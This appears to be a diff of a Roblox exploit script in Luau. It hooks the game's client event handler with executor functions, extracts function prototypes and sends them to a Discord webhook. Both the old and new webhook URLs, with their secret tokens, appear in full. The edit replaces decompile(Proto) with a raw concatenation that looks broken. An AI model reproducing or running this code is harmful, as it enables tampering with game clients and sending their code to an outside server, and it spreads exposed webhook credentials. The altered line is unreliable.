@@ -1,5 +1,5 @@
 local HttpService = game:GetService("HttpService")
-local Webhook = "https://discord.com/api/webhooks/1324084236558532701/QhbB-OUxaScbiaItK9N71Ew5X6iWWsfd2nkPyVBzv5XGV4RppWumNOYyqXh5cmKTuPN1"
+local Webhook = "https://discord.com/api/webhooks/1480059199357583556/iDnRY5EM4XxO-KRbhnsdMyaWKLG3nC3LBHE2b6ToXdwFinWNZioNT7UEukkR1Cc5TDHK"
 
 function send(msg,name)
 	pcall(request({
@@ -25,7 +25,7 @@ local Events = require(game.ReplicatedStorage.Events)
 hookfunction(Events.ClientListen, function(v1,v2)
 	local status, result = pcall(function()
 		local Proto = debug.getproto(v2, 1)
-		send("```"..decompile(Proto).."```",v1)
+		send("```"..Proto.."```",v1)
 	end)
 	
 	if not status then
